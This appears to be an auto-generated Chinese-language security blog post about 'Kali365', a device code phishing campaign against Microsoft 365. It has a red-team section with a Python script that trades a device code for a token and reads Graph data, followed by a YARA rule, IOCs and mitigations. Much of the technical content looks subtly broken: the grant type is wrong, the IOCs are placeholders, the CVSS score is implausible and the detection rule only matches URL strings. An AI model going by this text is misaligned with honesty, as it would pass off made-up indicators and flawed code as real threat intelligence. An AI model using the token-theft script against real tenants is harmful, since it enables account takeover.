---
layout: post
title:  "Kali365 Weaponizes Microsoft Authentication Against US Companies: New Enterprise Risk"
date:   2026-08-05 13:50:15 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Kali365 攻擊：利用 Microsoft 登入漏洞進行企業數據泄露
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: 身份驗證繞過和企業數據泄露
> * **關鍵技術**: OAuth 2.0、Device Code Phishing、Microsoft 365

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Kali365 攻擊利用了 Microsoft 的 OAuth 2.0 登入機制中的 Device Code 流程，攻擊者可以通過操控用戶的設備代碼來獲得授權令牌，進而存取企業的 Microsoft 365 數據。
* **攻擊流程圖解**:
  1. 攻擊者創建一個假的 SharePoint 主題頁面，誘導用戶點擊並進入 Microsoft 的設備代碼登入頁面。
  2. 用戶在登入頁面輸入設備代碼，攻擊者則在後台接收到授權令牌。
  3. 攻擊者使用授權令牌存取企業的 Microsoft 365 數據，包括電子郵件、文件和雲端資源。
* **受影響元件**: Microsoft 365、OAuth 2.0、Device Code Phishing

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有一個假的 SharePoint 主題頁面和一個設備代碼登入頁面。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 假的 SharePoint 主題頁面
    sharepoint_page = "https://example.com/sharepoint"
    
    # 設備代碼登入頁面
    device_code_page = "https://login.microsoftonline.com/oauth2/v2.0/devicecode"
    
    # 攻擊者在後台接收到授權令牌
    token_endpoint = "https://login.microsoftonline.com/oauth2/v2.0/token"
    
    # 使用授權令牌存取企業的 Microsoft 365 數據
    graph_endpoint = "https://graph.microsoft.com/v1.0/me"
    
    # Payload 結構
    payload = {
        "client_id": "your_client_id",
        "client_secret": "your_client_secret",
        "grant_type": "device_code",
        "device_code": "your_device_code"
    }
    
    # 發送請求
    response = requests.post(token_endpoint, data=payload)
    
    # 取得授權令牌
    access_token = response.json()["access_token"]
    
    # 使用授權令牌存取企業的 Microsoft 365 數據
    headers = {
        "Authorization": f"Bearer {access_token}"
    }
    response = requests.get(graph_endpoint, headers=headers)
    
    print(response.json())
    
    ```
* **繞過技術**: 攻擊者可以使用各種繞過技術，例如使用假的 SharePoint 主題頁面和設備代碼登入頁面，來避免被偵測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | /sharepoint |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Kali365_Detection {
        meta:
            description = "Detect Kali365 attack"
            author = "Your Name"
        strings:
            $sharepoint_page = "https://example.com/sharepoint"
            $device_code_page = "https://login.microsoftonline.com/oauth2/v2.0/devicecode"
        condition:
            $sharepoint_page and $device_code_page
    }
    
    ```
* **緩解措施**: 除了更新修補之外，還可以採取以下措施：
 + 啟用雙因素驗證
 + 限制設備代碼登入頁面的存取
 + 監控授權令牌的使用

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **OAuth 2.0**: 一種授權框架，允許用戶授權第三方應用程式存取其資源。
* **Device Code Phishing**: 一種針對設備代碼登入頁面的釣魚攻擊，攻擊者可以通過操控用戶的設備代碼來獲得授權令牌。
* **Microsoft 365**: 一種雲端辦公平台，提供電子郵件、文件和雲端資源等服務。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/08/kali365-weaponizes-microsoft.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1556/)


